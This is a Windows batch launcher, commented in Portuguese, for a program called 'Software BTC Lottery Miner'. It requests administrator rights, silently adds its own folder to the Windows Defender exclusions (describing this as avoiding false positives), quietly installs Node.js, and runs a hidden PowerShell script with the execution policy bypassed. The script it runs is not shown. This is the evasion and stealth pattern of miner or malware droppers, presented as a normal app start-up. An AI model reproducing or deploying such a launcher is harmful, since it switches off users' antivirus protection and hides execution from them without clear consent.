@echo off
cd /d "%~dp0"
title Software BTC Lottery Miner - Iniciando...
color 0E

:: ==========================================
:: SOLICITA PRIVILEGIOS DE ADMINISTRADOR
:: Necessario para configurar o Antivirus e Node.js
:: ==========================================
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin
) else (
    echo.
    echo  [!] Solicitando permissao de Administrador...
    powershell -Command "Start-Process '%~dpnx0' -Verb RunAs"
    exit /b
)
:admin
cd /d "%~dp0"

echo.
echo  =========================================
echo    Software BTC Lottery Miner - Iniciando...
echo  =========================================
echo.

:: Tenta adicionar exclusao no Windows Defender para evitar falsos positivos (requer admin, falha silenciosamente se nao tiver)
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

:: Verifica se Node.js esta instalado
where node >nul 2>&1
if %errorlevel% neq 0 (
    echo  [!] Node.js nao encontrado. Instalando automaticamente...
    echo.
    powershell -Command "& {Invoke-WebRequest -Uri 'https://nodejs.org/dist/v20.11.0/node-v20.11.0-x64.msi' -OutFile '%TEMP%\node-setup.msi'; Start-Process msiexec.exe -Wait -ArgumentList '/i %TEMP%\node-setup.msi /quiet /norestart'; $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')}"
    echo  [OK] Node.js instalado! Reinicie o programa clicando em INICIAR novamente.
    pause
    exit /b 0
)

:: Cria atalho na Area de Trabalho automaticamente com icone do Bitcoin
powershell -Command "$path=[Environment]::GetFolderPath('Desktop')+'\Software BTC Lottery Miner.lnk'; $s=(New-Object -COM WScript.Shell).CreateShortcut($path); $s.TargetPath='%~dpnx0'; $s.WorkingDirectory='%~dp0'; $s.IconLocation='%~dp0public\bitcoin_hd.ico'; $s.Save()" >nul 2>&1

:: Inicia o PowerShell ignorando a politica de execucao, de forma invisivel
:: O tray_icon.ps1 vai matar processos antigos, subir o servidor, colocar o icone e abrir o painel
start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0tray_icon.ps1"
exit

